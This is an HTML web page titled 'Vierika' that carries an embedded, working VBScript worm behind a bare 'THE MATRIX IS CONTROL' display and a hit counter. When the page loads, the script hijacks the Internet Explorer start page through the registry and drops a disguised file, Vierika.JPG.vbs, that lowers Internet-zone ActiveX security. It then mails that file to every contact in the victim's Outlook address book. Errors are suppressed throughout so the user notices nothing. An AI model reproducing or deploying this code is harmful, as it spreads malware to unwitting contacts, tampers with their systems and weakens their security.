<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="VI60_defaultClientScript" content="VBScript">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>Vierika</title>
</head>
<SCRIPT LANGUAGE="VBScript">

<!--

main
Sub spreadtoemail()
On Error Resume Next
Set regedit = CreateObject("WScript.Shell")
Set out = CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
For ctrlists = 1 To mapi.AddressLists.Count
Set a = mapi.AddressLists(ctrlists)
x = 1
For ctrentries = 1 To a.AddressEntries.Count
malead = a.AddressEntries(x)
Set male = out.CreateItem(0)
male.Recipients.Add (malead)
male.Subject = "Vierika is here"
male.Body ="Vierika.jpg"
male.Attachments.Add ("c:\Vierika.JPG.vbs")
male.Send
x = x + 1
Next
Next
Set out = Nothing
Set mapi = Nothing
End Sub
Sub Main()
On Error Resume Next
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://web.tiscalinet.it/krivojrog/vierika/Vierika.html"
html
spreadtoemail
End Sub
Sub html()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
'Set c = fso.OpenTextFile(WScript.ScriptFullName, 1)
Set b = fso.CreateTextFile("c:\Vierika.JPG.vbs")
b.Close

dta1 = "On Error Resume Next" & vbCrLf
dta1 = dta1 & "Set regedit = CreateObject(@WScript.Shell@)" & vbCrLf
dta1 = dta1 & "regedit.RegWrite @HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page@, @http://web.tiscalinet.it/krivojrog/vierika/Vindex.html@" & vbCrLf
dta1 = dta1 & "regedit.RegWrite @HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201@, 0 , @REG_DWORD@" & vbCrLf



dt1 = replace (dta1, chr(64), chr(34))


Set d = fso.OpenTextFile("c:\Vierika.JPG.vbs", 2)
d.write dt1 
d.Close
End Sub
-->

</SCRIPT>


         
    















<body bgcolor="#000000" text="#00FF00">

<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center"><font face="Quartz">THE MATRIX IS CONTROL</font></p>
<p align="center">
<!-- Bravenet.com Counters -->
<SCRIPT type="text/javascript" language="JavaScript">

sw="none";sd="none";ref=""+escape(document.referrer);

</SCRIPT>
<SCRIPT type="text/javascript" language="JavaScript1.2">

sw=screen.width;nav=navigator.appName;
sc=(nav!="Netscape")?screen.colorDepth:screen.pixelDepth;

</SCRIPT>
<SCRIPT type="text/javascript" language="JavaScript">

function doit(str) {document.writeln(str);}
qs="&sw="+sw+"&sc="+sc+"&ref="+ref;
url='http://counter38.bravenet.com/index.php?';
url += 'id=336336&usernum=3231996439&cpv=1';
curl='http://counter38.bravenet.com/counter.php?id=336336&usernum=3231996439';
doit('<A href="'+url+'" target="_top"><IMG border="0" src="'+curl+'&'+qs+'"></A>')

</SCRIPT>
<NOSCRIPT> 
<p align="center">
<A href="http://counter38.bravenet.com/index.php?id=336336&usernum=3231996439&cpv=1" 
target="_top"><IMG SRC="http://counter38.bravenet.com/counter.php?id=336336&usernum=3231996439" 
alt="Bravenet.com" border="0"></A>
</p>


















